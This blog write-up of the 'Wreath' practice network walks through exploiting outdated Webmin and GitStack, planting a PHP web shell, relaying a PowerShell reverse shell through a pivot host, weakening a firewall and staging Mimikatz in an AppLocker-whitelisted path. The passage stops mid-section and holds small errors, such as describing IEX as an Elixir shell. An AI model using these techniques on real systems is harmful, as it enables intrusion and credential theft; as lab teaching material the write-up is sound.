---
layout: post
title:  Wreath Writeup
description: This challenge involved exploiting a vulnerable network of three computers. Two of which were susceptible to exploitations of outdated software. The last machine involved a unique foothold centered around the creation of a malicious image file. I highly encourage you to read this writeup, as I go into detail about how Mimikatz, evil-winrm, and network pivoting work.
date:   2021-03-22 
image:  '/images/0xd4y-logo-gray.png'
tags:   [Windows, Linux, Network pivoting, RCE, CVE]
---

<div>

# <span class="c30 c11 c0"></span>

</div>

<span>Wreath Network</span>

<span>A look into the exploitation of a vulnerable network and “secure” PC.</span>

<span class="c0 c39 c71">   </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 333.50px; height: 344.19px;">![](/_reports/Wreath/0xd4y-logo-gray.png)</span>

**This report can be read both on this site, and as its <a href = "https://zezul.github.io/reports/Archangel%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**


<span class="c30 c44 c51">0xd4y</span>

<span class="c48 c39 c51 c61">3-30-2021</span>

<span class="c0 c39 c57"></span>

<span class="c1"></span>

<span class="c50 c68 c77"></span>

<span class="c48 c44 c39 c51">0xd4y Writeups</span>

<span class="c0 c39">LinkedIn:</span> <span class="c24">[https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653835189669299&usg=AOvVaw1PwgN1p3s7Z0ZGOXseBe4h)</span><span class="c9"> </span>

<span class="c0 c39">Email:</span> <span class="c24">[0xd4yWriteups@gmail.com](mailto:0xd4yWriteups@gmail.com)</span>

<span class="c0 c39">Web:</span><span class="c39 c51"> </span><span class="c24">[https://0xd4y.github.io/](https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&sa=D&source=editors&ust=1653835189670049&usg=AOvVaw1Rpp7THBa39kzt3p8ORRU7)</span><span class="c39 c51"> </span>

<span class="c2 c39 c43">Table of Contents</span>

<span class="c15 c0">[Executive Summary](#h.omwkq2eecx6j)</span><span class="c15 c0">        </span><span class="c15 c0">[2](#h.omwkq2eecx6j)</span>

<span class="c15 c0">[Attack Narrative](#h.kvwv83c9x680)</span><span class="c0 c15">        </span><span class="c15 c0">[3](#h.kvwv83c9x680)</span>

<span class="c25 c2">[First Machine (.200)](#h.55makcv3sid9)</span><span class="c25 c2">        </span><span class="c25 c2">[3](#h.55makcv3sid9)</span>

<span class="c1">[Reconnaissance](#h.15brehgu2heh)</span><span class="c1">        </span><span class="c1">[3](#h.15brehgu2heh)</span>

<span class="c1">[RCE Exploitation](#h.d8eov7lrs3zk)</span><span class="c1">        </span><span class="c1">[5](#h.d8eov7lrs3zk)</span>

<span class="c1">[Reverse Shell](#h.1ksbyqawn0yj)</span><span class="c1">        </span><span class="c1">[6](#h.1ksbyqawn0yj)</span>

<span class="c1">[Persistence](#h.5ddj5nrdegir)</span><span class="c1">        </span><span class="c1">[6](#h.5ddj5nrdegir)</span>

<span class="c25 c2">[Second Machine (.150)](#h.dcefpauwop9v)</span><span class="c25 c2">        </span><span class="c25 c2">[7](#h.dcefpauwop9v)</span>

<span class="c1">[Host Enumeration](#h.1k055na5o1w)</span><span class="c1">        </span><span class="c1">[7](#h.1k055na5o1w)</span>

<span class="c1">[Port Enumeration](#h.eyuja3ce9gk7)</span><span class="c1">        </span><span class="c1">[8](#h.eyuja3ce9gk7)</span>

<span class="c1">[Port Forwarding](#h.k2f22ypbjcmx)</span><span class="c1">        </span><span class="c1">[8](#h.k2f22ypbjcmx)</span>

<span class="c1">[RCE Exploitation](#h.qh5mgzdky661)</span><span class="c1">        </span><span class="c1">[9](#h.qh5mgzdky661)</span>

<span class="c1">[Exploit Analysis](#h.eo2c10rr7b1l)</span><span class="c1">        </span><span class="c1">[10](#h.eo2c10rr7b1l)</span>

<span class="c1">[Reverse Shell](#h.knb7aexki2nv)</span><span class="c1">        </span><span class="c1">[11](#h.knb7aexki2nv)</span>

<span class="c1">[Pivoting through .200](#h.axirjpkdu9n4)</span><span class="c1">        </span><span class="c1">[11](#h.axirjpkdu9n4)</span>

<span class="c1">[Socat Relay Reverse Shell](#h.594oyljbb3l)</span><span class="c1">        </span><span class="c1">[12](#h.594oyljbb3l)</span>

<span class="c1">[Attempting to Use Mimikatz](#h.97vcit39qga2)</span><span class="c1">        </span><span class="c1">[14](#h.97vcit39qga2)</span>

<span class="c1">[Shell Stabilization](#h.s0te4qb4wj7s)</span><span class="c1">        </span><span class="c1">[15](#h.s0te4qb4wj7s)</span>

<span class="c1">[Mimikatz](#h.wzvkxqwdhgz4)</span><span class="c1">        </span><span class="c1">[16](#h.wzvkxqwdhgz4)</span>

<span class="c1">[How Mimikatz Works](#h.1e0d2cf2l81w)</span><span class="c1">        </span><span class="c1">[17](#h.1e0d2cf2l81w)</span>

<span class="c1">[How a Pass the Hash Attack (PtH) Works](#h.8gvjg5icy5vq)</span><span class="c1">        </span><span class="c1">[17](#h.8gvjg5icy5vq)</span>

<span class="c25 c2">[Third Machine (.100)](#h.s3o7v62f4w9x)</span><span class="c25 c2">        </span><span class="c2 c25">[18](#h.s3o7v62f4w9x)</span>

<span class="c1">[Port Enumeration](#h.9v37capbt8vh)</span><span class="c1">        </span><span class="c1">[18](#h.9v37capbt8vh)</span>

<span class="c1">[Forward SOCKS Proxy](#h.rawsub1p8kzq)</span><span class="c1">        </span><span class="c1">[19](#h.rawsub1p8kzq)</span>

<span class="c1">[Examining the Web Server](#h.u8r3yk24cxai)</span><span class="c1">        </span><span class="c1">[20](#h.u8r3yk24cxai)</span>

<span class="c1">[Analysing the Website’s Code](#h.95p9eivup4ma)</span><span class="c1">        </span><span class="c1">[20](#h.95p9eivup4ma)</span>

<span class="c1">[Reverse Shell](#h.vg0sz8mjbd24)</span><span class="c1">        </span><span class="c1">[23](#h.vg0sz8mjbd24)</span>

<span class="c1">[Privilege Escalation to System](#h.6pr2bnv2a7sq)</span><span class="c1">        </span><span class="c1">[24](#h.6pr2bnv2a7sq)</span>

<span class="c1">[Searching for Misconfigurations](#h.cl07y2tty6ln)</span><span class="c1">        </span><span class="c1">[24](#h.cl07y2tty6ln)</span>

<span class="c1">[Unquoted Service Path Attack](#h.620okmtojvdb)</span><span class="c1">        </span><span class="c1">[25](#h.620okmtojvdb)</span>

<span class="c1">[How an Unquoted Service Path Attack Works](#h.akupm4bz6btj)</span><span class="c1">        </span><span class="c1">[25](#h.akupm4bz6btj)</span>

<span class="c1">[Creating a Malicious Binary](#h.qosauuxwt7yv)</span><span class="c1">        </span><span class="c1">[25](#h.qosauuxwt7yv)</span>

<span class="c1">[Data Exfiltration](#h.9fxlslg9cn9k)</span><span class="c1">        </span><span class="c1">[28](#h.9fxlslg9cn9k)</span>

<span class="c15 c0">[Cleanup](#h.az3rsnxxjyhg)</span><span class="c15 c0">        </span><span class="c15 c0">[29](#h.az3rsnxxjyhg)</span>

<span class="c15 c0">[Conclusion](#h.yctyzetjy9no)</span><span class="c15 c0">        </span><span class="c15 c0">[30](#h.yctyzetjy9no)</span>

<span class="c1"></span>

# <span>Executive Summary</span>

<span>I was tasked with finding vulnerabilities in a client’s network (Thomas Wreath)</span><sup>[[1]](#ftnt1)</sup><span class="c1">. The attacks conducted in this report were not carried out in a black-box penetration testing environment, rather the client informed us that he had a git server hosted on one of the machines in his network from which he hosts his website. Furthermore, I was told that there are three computers in the client’s network, one of which the client assumed I could not penetrate as it had antivirus software installed.</span>

<span>Though the client was cautious about downloading potentially dangerous software on any of his systems, he did not update software on two out of three computers, allowing me to gain immediate root access on two thirds of the network. The third machine ran insecure code on a web page which could be exploited through uploading a malicious image file.</span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

<span class="c1"></span>

# <span>Attack Narrative</span>

## <span>First Machine (.200)</span>

<span class="c1">We are given the ip of one of the systems on the network. This is the only machine in the network that can be immediately accessed, and thus it will be the first target.</span>

### <span>Reconnaissance</span>

<span>As with all penetration tests, I started by enumerating the ports of the target. This is an important step, as it is useful in identifying possible attack vectors. The services and versions of our target can be enumerated using the nmap tool and giving it the flags</span> <span class="c0">-sC</span> <span>and</span> <span class="c0">-sV</span><span>. The</span> <span class="c0">-sC</span><span>flag runs nmap’s default scripts, while the</span> <span class="c0">-sV</span><span>flag detects the versions of the scanned services. Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable (old versions tend to have more known vulnerabilities, as they have been exposed to the warzone of the internet for a longer period of time). We can enumerate all open ports with the</span> <span class="c0">-p-</span><span>flag and output all formats with the</span> <span class="c0">-oA</span><span class="c1"> flag.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 206.67px;">![](/_reports/Wreath/image28.png)</span>

<span class="c1">We see that there are only four ports open. From the nmap scan, observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively. It’s important to notice that it is running Apache httpd 2.4.37 which belongs to the CentOS Linux distribution. Therefore, it’s very likely that the target is running CentOS.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 400.62px; height: 108.50px;">![](/_reports/Wreath/image43.png)</span>

<span>Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to</span> <span class="c0">https://thomaswreath.thm</span><span class="c1">. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 397.50px; height: 47.01px;">![](/_reports/Wreath/image38.png)</span>

<span>Currently, this domain is not recognized by any of our</span> <span>VirtualHost</span><sup>[[2]](#ftnt2)</sup><span> </span><span>definitions. However, adding</span> <span class="c0">thomaswreath.thm</span><span>to the</span> <span class="c0">/etc/hosts</span><span class="c1"> file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output:.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.00px; height: 20.00px;">![](/_reports/Wreath/image5.png)</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 433.50px; height: 100.04px;">![](/_reports/Wreath/image21.png)</span>

<span>We can add the</span> <span class="c0">-k</span><span class="c1"> flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test):</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 456.50px; height: 158.02px;">![](/_reports/Wreath/image65.png)</span>

<span class="c1">And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 471.50px; height: 139.03px;">![](/_reports/Wreath/image7.png)</span>

<span class="c1">One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced'' box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 281.00px; height: 27.00px;">![](/_reports/Wreath/image45.png)</span>

<span class="c1">I now proceeded to the website and was met with the following page:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 524.50px; height: 249.64px;">![](/_reports/Wreath/image39.png)</span>

### <span class="c27 c0">RCE Exploitation</span>

<span>Nothing out of the ordinary was found while browsing through this website. However, going back to the result of the nmap scan and l</span><span>ooking at the software version of the Webmin interface, it turned out that this service was outdated. Searching this service on Google revealed that there is a CVE (Common Vulnerabilities and Exposures) for it. Namely, this vulnerability is categorised as</span> <span>CVE-2019-15107</span><sup>[[3]](#ftnt3)</sup><span class="c1"> and ranked as a 9.8 critical vulnerability. Exploiting this vulnerability allows unauthorized remote code execution (RCE) due to a backdoor in the password resetting function.</span>

#### <span>Reverse Shell</span>

<span class="c1">Seeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 570.50px; height: 149.94px;">![](/_reports/Wreath/image49.png)</span>

<span class="c1">After setting the LHOST and RHOST, I ran the exploit and got a shell!</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.50px; height: 92.16px;">![](/_reports/Wreath/image47.png)</span>

<span>The web server was running as root!</span><span> </span><span>It is better practice to run a web service as a low-privileged user such as</span> <span class="c0">www-data</span><span class="c1"> just in case the web server gets compromised.</span>

#### <span>Persistence</span>

<span class="c1">As root, the highest-privileged Linux user, we can extract the hash of users on the system and try to crack it. It’s possible that this same password is used in some other machine on the network.  </span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 464.00px; height: 44.00px;">![](/_reports/Wreath/image58.png)</span>

<span>Providing the</span> <span class="c0">--example-hashes</span><span>flag in</span> <span class="c0">hashcat</span><span>(a tool for cracking hashes) and grepping for</span> <span class="c0">unix</span><span>, we can see that the mode for the</span> <span class="c0">/etc/shadow</span> <span>hashes is 1800 (</span><span class="c2">note that the hash corresponding to mode 1800 looks most similar to the hashes in the /etc/shadow file</span><span class="c1">).</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 539.50px; height: 149.57px;">![](/_reports/Wreath/image27.png)</span>

<span class="c1">Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.50px; height: 44.60px;">![](/_reports/Wreath/image37.png)</span>

<span class="c1">The password used for the root user is secure enough to not be cracked by the rockyou.txt file, so I copied this hash to examine for later if needed.</span>

<span>After compromising the root user, I maintained persistence by going into</span> <span class="c0">/root/.ssh/id_rsa</span><span class="c1"> and copying the contents of the id_rsa file (this is a private key which is used to authenticate a client to a server).</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.67px; height: 147.87px;">![](/_reports/Wreath/image29.png)</span>

## <span class="c44 c0 c39 c56"></span>

## <span>Second Machine (.150)</span>

### <span>Host</span> <span class="c27 c0">Enumeration</span>

<span>With full access on</span><span> one of the three machines on the Wreath network, I enumerated the internal network to find any other systems by using nmap on the compromised system (a static binary of it can be downloaded on GitHub</span><sup>[[4]](#ftnt4)</sup><span>).</span><span>To speed up the process, I added the</span> <span class="c0">-sn</span><span class="c1"> flag which disables port scans.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 495.50px; height: 256.57px;">![](/_reports/Wreath/image33.png)</span>

<span>We see that there are a total of four other machines on the internal network (</span><span class="c2">note we are 10.200.111.200</span><span>). I was told by the client that the host ending in</span> <span class="c0">.1</span><span>is part of the AWS infrastructure used for creating the network, and the host ending in</span> <span class="c0">.250</span><span>is the OpenVPN server. As such, we will focus on the two hosts ending in</span> <span class="c0">.100</span><span>and</span> <span class="c0">.150</span><span class="c1">.</span>

#### <span class="c4 c0">Port Enumeration</span>

<span class="c1">After discovering these two hosts, I enumerated their ports:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 556.50px; height: 123.96px;">![](/_reports/Wreath/image34.png)</span>

<span class="c1">Observe that all of the ports on the .100 machine are filtered, but the .150 computer has three ports open (80, 3389, and 5985). It’s important to note that it’s likely this is a Windows machine due to ports 3389 (typically reserved for RDP) and 5985 (WRM / WinRM) being open.</span>

### <span>Port</span><span class="c27 c0"> Forwarding</span>

<span>The HTTP service on port 80 is a good one to forward because web servers have a big attack surface (I chose to forward this port to localhost on port 18020 using</span> <span class="c0">ssh</span><span class="c1">).</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 562.50px; height: 65.25px;">![](/_reports/Wreath/image48.png)</span>

<span>Now when I visited</span> <span class="c0">localhost:18020</span><span class="c1">, I was met with a web page:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 559.50px; height: 132.70px;">![](/_reports/Wreath/image32.png)</span>

<span class="c1">Looking at the error on the webpage, we see that there are three directories:</span>

1.  <span class="c1">registration/login/</span>
2.  <span class="c1">gitstack/</span>
3.  <span class="c1">rest/</span>

<span class="c1">The /user subdirectory under /rest discloses information about the users on the GitStack software, but I was unable to find anything that looked alarming.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 196.00px; height: 29.00px;">![](/_reports/Wreath/image44.png)</span>

<span class="c1">Visiting /gitstack redirected me to a login page on /registration/login:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.83px; height: 223.33px;">![](/_reports/Wreath/image50.png)</span>

<span class="c1">There is a nice handy message that says the default username and password is admin/admin, but trying it out reveals that the credentials for this login page have since been changed. The source code of the page did not reveal anything either.</span>

### <span class="c27 c0">RCE Exploitation</span>

<span>However, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of</span> <span class="c0">nikto</span><span class="c1">, a tool for scanning vulnerabilities on web servers:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.50px; height: 112.07px;">![](/_reports/Wreath/image9.png)</span>

<span class="c50 c35 c2">Note the large amount of outdated software</span>

<span class="c29 c2"></span>

<span class="c1">It follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 479.50px; height: 209.78px;">![](/_reports/Wreath/image16.png)</span>

<span>All three exploit results about GitStack are about the same version (namely 2.3.10). I then copied the exploit</span> <span class="c0">php/webapps/43777.py</span><span class="c1"> onto my local machine.</span>

#### <span>Exploit Analysis</span>

<span class="c1">Before running this exploit, we will examine it to see how it works:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 535.50px; height: 37.76px;">![](/_reports/Wreath/image14.png)</span>

<span>As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical</span> <span>vulnerability was caused by passing</span><span> unsanitized user input into an exec function</span><sup>[[5]](#ftnt5)</sup><span class="c1">:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 251.50px; height: 56.33px;">![](/_reports/Wreath/image15.png)</span>

<span>When running the script, it uploads a PHP web shell called</span> <span class="c0">exploit.php</span><span>with the parameter</span> <span class="c0">‘a’</span><span class="c1"> to the /web directory (I modified the script and called it exploit-0xd4y.php, as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor, parameters, etc).</span>

#### <span class="c4 c0">Reverse Shell</span>

<span>I curled this web shell and provided it the</span> <span class="c0">-d</span><span class="c1"> flag to specify the data to be inputted:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 41.01px;">![](/_reports/Wreath/image13.png)</span>

<span>And this web server is running as System, the highest-privileged Windows user (even higher than Administrator)!</span><span class="c72"> </span><span>I then tried to find a way to get a reverse shell from the exploited system. The first thing to test is to see if our attack box can be pinged from the target</span><span class="c0"> </span><span>(I made sure to use the</span> <span class="c0">-n</span><span class="c1"> flag to specify how many packets to send). It is extremely important to note this seemingly insignificant flag. If we were to not specify how many packets to send, the server would constantly be trying to ping us, and there would be no way for us to stop this command without somehow killing the process. A constant ping to our attack box would therefore look suspicious.</span>

### <span class="c27 c0">Pivoting through .200</span>

<span class="c1">We can set up a tcpdump on the tun0 interface (the VPN routing path) and provide it with the icmp argument (Internet Control Message Protocol) so that we are only listening for pinging packets.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 209.75px;">![](/_reports/Wreath/image40.png)</span>

<span>Alas, I did not receive a response from the server. This meant that we cannot send a direct reverse shell from .150 to us. However, we can use</span> <span>nishang</span><sup>[[6]](#ftnt6)</sup><span> to get</span><span> a socat reverse shell relay. CentOS, the operating system of the compromised</span><span class="c0"> </span><span class="c1">.200 machine, has a very restrictive firewall called firewalld that will limit almost all inbound connections.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 549.50px; height: 102.15px;">![](/_reports/Wreath/image46.png)</span>

<span class="c35 c2">We can see that the firewall is</span> <span class="c2 c12">active</span>

<span class="c73 c2 c51 c78"></span>

<span class="c1">Unfortunately, our attack box cannot “talk” with the .150 machine directly, but the host ending in .200 can. This means that we could get a reverse shell by setting up a listener on the .200 machine which forwards traffic to us, and then have the .150 host directly send the reverse shell to the .200 host.</span>

#### <span class="c4 c0">Socat Relay Reverse Shell</span>

<span class="c1">I used a socat reverse shell to demonstrate this, as it is instructive on how networking traffic can be directed:</span>

<span class="c1"></span>

1.  <span class="c1">We are going to set up a listening port on 20001 on the .200 machine and forward all traffic from that port to 20002 on our machine.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 18.67px;">![](/_reports/Wreath/image35.png)</span>

1.  <span class="c1">Next, we will set up netcat listening on port 20002 on our system:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 415.50px; height: 28.63px;">![](/_reports/Wreath/image66.png)</span>

1.  <span>I used the Invoke-PowerShellTcp.ps1</span> <span>nishang</span><span>script and added</span> <span class="c0">Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001</span><span class="c1"> to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 146.67px;">![](/_reports/Wreath/image20.png)</span>

<span class="c35 c2 c50">Note how we are sending the reverse shell to .200 on port 20001 (remember all traffic on port 20001 will be directed to our port 20002 on our machine).</span>

1.  <span>Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the</span> <span class="c0">firewall-cmd</span><span class="c1"> command as such:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 69.37px;">![](/_reports/Wreath/image41.png)</span>

<span class="c35 c2">Alternatively you can type</span> <span class="c35 c2 c0">systemctl stop firewalld</span><span class="c50 c35 c2"> to completely disable the firewall, though this is one of the noisiest actions a pentester can do, and it should only be done when it is an absolute necessity.</span>

<span class="c1">Remember that port 20001 will be directing all traffic to us.</span>

1.  <span>Port 20003 will be the HTTP server on</span> <span class="c0">.200</span><span>which we can set up with</span> <span class="c0">python3 -m http.server 20003</span><span>; it will serve the powershell reverse shell file (which I renamed to</span> <span class="c0">0xd4y-rev.ps1</span><span class="c1">).</span>
2.  <span class="c1">Finally, it’s time for the payload. We can download files / strings using IEX (Elixir’s Interactive Shell) in powershell.  </span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 49.04px;">![](/_reports/Wreath/image70.png)</span>

<span class="c35 c2">Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotes.</span>

<span class="c1">Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work:        </span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 67.44px;">![](/_reports/Wreath/image64.png)</span>

<span class="c1">Sure enough, when I executed this command, the output hanged and I got a hit on the python HTTP server!</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 439.50px; height: 39.23px;">![](/_reports/Wreath/image77.png)</span>

<span>So now that</span> <span class="c0">0xd4y-rev.ps1</span><span class="c1"> was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 387.50px; height: 116.08px;">![](/_reports/Wreath/image17.png)</span>

#### <span>Attempting to Use Mimikatz</span>

<span>Now, with a reverse shell as System, we have the necessary privileges to extract password hashes using</span> <span class="c0">Mimikatz</span><span class="c1">, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 383.72px; height: 209.17px;">![](/_reports/Wreath/image53.png)</span>

<span class="c1">Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 506.50px; height: 94.97px;">![](/_reports/Wreath/image25.png)</span>

<span>I downloaded this binary in the</span> <span class="c0">C:\Windows\System32\spool\drivers\color</span><span class="c1"> directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.</span>

<span>Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named</span> <span class="c0">sshuttle</span> <span class="c1">can be leveraged as a VPN into this internal network:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 45.33px;">![](/_reports/Wreath/image12.png)</span>

<span class="c1">We can confirm this worked by trying to curl the web page:</span>

